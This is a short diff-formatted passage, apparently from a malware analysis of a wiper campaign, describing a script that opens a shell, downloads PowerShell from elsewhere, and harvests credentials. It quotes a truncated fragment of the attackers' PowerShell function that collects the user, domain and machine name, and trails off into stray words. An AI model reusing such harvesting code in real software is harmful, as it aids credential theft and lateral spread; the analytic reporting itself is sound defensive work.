@@ -1,0 +1,8 @@
+
+The preceding script opens a command shell on the victim’s machine and downloads a PowerShell script from an external location.
+From another location, it loads a second file to execute.
+We discovered one of the PowerShell scripts.
+Part of the code shows they were harvesting usernames, passwords, and domains: function primer { if ($env:username -eq “$($env:computername)$”){$u=”NT AUTHORITY\\SYSTEM”}else{$u=$env:username} $o=”$env:userdomain\\$u $env:computername $env:PROCESSOR_ARCHITECTURE
+With legitimate credentials to a network it is easy to login and spread the wipers.
+.Net
+tool kit
